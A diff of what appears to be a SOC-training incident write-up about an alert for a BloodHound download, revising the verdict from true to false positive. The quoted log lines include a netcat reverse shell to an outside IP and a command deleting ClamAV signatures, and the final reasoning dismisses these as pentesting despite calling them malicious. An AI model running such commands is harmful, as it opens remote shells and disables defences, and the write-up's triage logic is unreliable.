@@ -39,12 +39,14 @@ Network connections:
 - 13.06.2021 16:23:15 - 172.16.20.4
 - 13.06.2021 16:23:19 - 172.16.20.6
 
-The only processes that appear to be suspicious doesn't have a date. 
+The only processes that appear to be suspicious don't have a date. 
 - nc 101.32.223.119 1234 -e /bin/sh - transfers the bash code to detected malicious Hong Kong domain using netcat.
 - rm -f /var/lib/clamav-unofficial-sigs/pid/clamav-unofficial-sigs.pid - looks like Linux AV and it's signatures were removed. 
 - A SQL database was accessed.
 
 ![Screenshot 2023-02-17 at 9 19 59 AM](https://user-images.githubusercontent.com/74877876/219680134-b389f0b0-a18e-4d99-8e36-c26cba644f3a.png)
+
+The other processes, I don't find suspicious. They pulled another operating system and run it on VMware on the device. The processes I find suspicious I'm going to determine as malicious but the other processes aren't. 
 
 The host machine is an Ubuntu machine so we know it's not an executable file that was accessed, but we're going to continue to analyze the file. 
 
@@ -52,7 +54,6 @@ The host machine is an Ubuntu machine so we know it's not an executable file tha
 - Looking at https://github.com/BloodHoundAD/BloodHound/releases doesn't show any malicious detections. 
 - Looking at 140.82.121.4 doesn't show any detections but shows the address is based in Denmark and connected to GitHub.
 - While there lots of files 140.82.121.4 communicated with BloodHound's GitHub doesn't appear to be one of them. 
-- The destination address doesn't show any relationships to BloodHound's GitHub. 
 
 Since I'm familiar with GitHub, I looked up BloodHound's GitHub and was able to find the releases page. The URL does match the requested URL.
 
@@ -63,9 +64,9 @@ Let's look at BloodHound's GitHub is about.
 It definitely seems like their content is for pentesting. 
 
 ## Determination
-Determining to be true positive since the file was accessed according to the logs. The file and the logs are suspicious based on the processes performed but looking into the intent of BloodHound's GitHub, the file was used for pentesting.  
+Determining to be false positive since the file was accessed according to the logs but used for pentesting. The file and the logs are suspicious based on the processes performed but looking into the intent of BloodHound's GitHub, the file was used for pentesting.  
 
-While suspicious, not malicious. 
+While suspicious and the file malicious, it was used for pentesting.
 
 ## Helpful Link
 - GitHub: https://github.com/BloodHoundAD/BloodHound
